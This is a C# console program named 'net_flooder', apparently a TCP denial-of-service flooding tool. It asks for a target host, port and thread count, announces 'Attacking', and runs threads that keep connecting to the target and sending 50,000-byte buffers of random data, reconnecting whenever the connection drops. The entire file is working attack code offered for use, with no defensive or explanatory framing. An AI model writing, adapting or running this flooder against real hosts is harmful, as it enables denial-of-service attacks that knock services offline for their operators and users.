using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace net_flooder {
	class core {
		private static double TIMEOUT = 3000;
		private static int BUFFER_SIZE = 50000;
		private static int RECONNECTS = 1;
		private static int THREAD_COUNT = 1;
		static void Main( string[] args ) {
			IPEndPoint trg;
			try {
        var hosts = Dns.GetHostAddresses(_q("Type host"));
				if ( hosts.Length==0 ) {
					_e( "no ips" );
					return;
				}
				trg = new IPEndPoint( hosts[0], 0 );
			}
			catch ( System.Exception ex ) {
				_e( ex.Message );
				return;
			}
			int port;
      while ( !int.TryParse(_q("Insert port"), out port) ) ;
      trg.Port = port;
			while ( !int.TryParse( _q( "Insert THREAD_COUNT" ), out THREAD_COUNT ) );
			Console.WriteLine( "Attacking {0}", trg.ToString() );
			try {
				for ( int i = 0; i < THREAD_COUNT; i++ )
					new Thread( new ParameterizedThreadStart( WAttack ) ).Start( trg );
                    Attack(trg);
			}
			catch ( Exception ex ) {
				_e( ex.Message );
				return;
			}
		}

		private static void WAttack( object trg ) {
			Attack( (IPEndPoint)trg );
		}
		/// <summary>
		/// Shoop da whoop!
		/// </summary>
		/// <param name="trg"></param>
		private static void Attack( IPEndPoint trg ) {
			#region Constructors
			Socket s = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
			Random r = new Random();
			SocketAsyncEventArgs Snd, Conn;
			var t = new System.Timers.Timer( TIMEOUT );//new TimerCallback(( a ) => { try { s.Close(); } catch { } })
			byte[] bytes = new byte[ BUFFER_SIZE ];
			EventHandler<SocketAsyncEventArgs> CONNECTED = null, SND = null;
			#endregion
			Conn = new SocketAsyncEventArgs() {
				DisconnectReuseSocket = true,
				RemoteEndPoint = trg,
				SocketFlags = SocketFlags.None,
				UserToken = s
			};
			Snd = new SocketAsyncEventArgs() {
				DisconnectReuseSocket = true,
				SocketFlags = SocketFlags.None,
				UserToken = s
			};
			SND = ( a, b ) => {
				try {
					bool running = true;
					while ( running ) {
						while ( b.SocketError == SocketError.Success && ( (Socket)a ).Connected )
							if ( ( (Socket)a ).SendAsync( Snd ) )
								return; //prevent stack overflow
						int cnt = 0;
						while ( cnt < RECONNECTS && ( b.SocketError != SocketError.Success || !( (Socket)a ).Connected ) ) {
							cnt++;
							if ( ( (Socket)a ).ConnectAsync( Conn ) )
								return; //prevent stack overflow
						}
						running = cnt < RECONNECTS;
						//reconnect
						if ( !running ) {
							Snd.UserToken = Conn.UserToken = a = s = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
							if ( ( (Socket)a ).ConnectAsync( Conn ) )
								return;
							else
								running = true;
						}
					}
				}
				catch {
				}
			};
			CONNECTED = ( a, b ) => {
				try {
					while ( b.SocketError != SocketError.Success || !( (Socket)a ).Connected )
						if ( ( (Socket)a ).ConnectAsync( Conn ) )
							return;
					if ( !( (Socket)a ).SendAsync( Snd ) )
						SND( a, Snd );
				}
				catch {
				}
			};

			Snd.Completed += SND;
			Conn.Completed += CONNECTED;
			r.NextBytes( bytes );
			Snd.SetBuffer( bytes, 0, bytes.Length );
			s.Blocking = false;

			if ( s.ConnectAsync( Conn ) )
				CONNECTED( s, Conn );
			Thread.Sleep( Timeout.Infinite );
		}
		/// <summary>
		/// show error
		/// </summary>
		/// <param name="e"></param>
		static void _e( string e ) {
			var con_c = Console.ForegroundColor;
			try { Console.ForegroundColor = ConsoleColor.Yellow; } catch {}
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine( e );
			try {Console.ForegroundColor = con_c;} catch {}
			Console.ReadLine();
		}
		/// <summary>
		/// ask user smth and get answer
		/// </summary>
		/// <param name="q"></param>
		/// <returns></returns>
		static string _q( string q ) {
			var con_c = Console.ForegroundColor;
			try { Console.ForegroundColor = ConsoleColor.Yellow; } catch {}
			string s = "";
			Console.Write( "{0}{1}>", q, Environment.NewLine );
			try {Console.ForegroundColor = con_c;} catch {}
			s = Console.ReadLine();
			return s;
		}
	}
}